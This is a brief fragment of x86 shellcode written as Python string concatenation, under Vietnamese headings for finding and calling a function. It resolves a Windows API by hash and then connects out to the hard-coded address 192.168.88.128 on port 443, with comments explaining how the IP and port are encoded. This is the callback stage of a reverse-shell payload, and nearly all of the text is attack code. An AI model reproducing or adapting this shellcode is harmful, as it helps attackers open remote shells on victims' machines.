## Assembly:
### Tìm hàm
```
code += "push 0xb32dba0c;"
code += "call dword ptr [ebp+0x4];"
code += "mov [ebp + 0x10], eax;"
```
### Gọi hàm
```
code += "xor eax, eax;"
code += "push eax;"
code += "push eax;"
code += "push 0x8058a8c0;" # 192.168.88.128 (0xc0: 192, 0xa8: 168, 0x58:88, 0x80: 128)
code += "mov bx, 0xbb01;" # port 443 (0x01bb: 443)
code += "shl ebx, 0x10;"
code += "mov eax, ebx;"
code += "add ax, 0x02;"
code += "push eax;"
code += "push esp;"
code += "pop edi;"
code += "xor eax, eax;"
code += "push eax;"
code += "push eax;"
code += "push eax;"
code += "push eax;"
code += "add al, 0x10;"
code += "push eax;"
code += "push edi;"
code += "push esi;"
code += "call [ebp+0x10];"
```
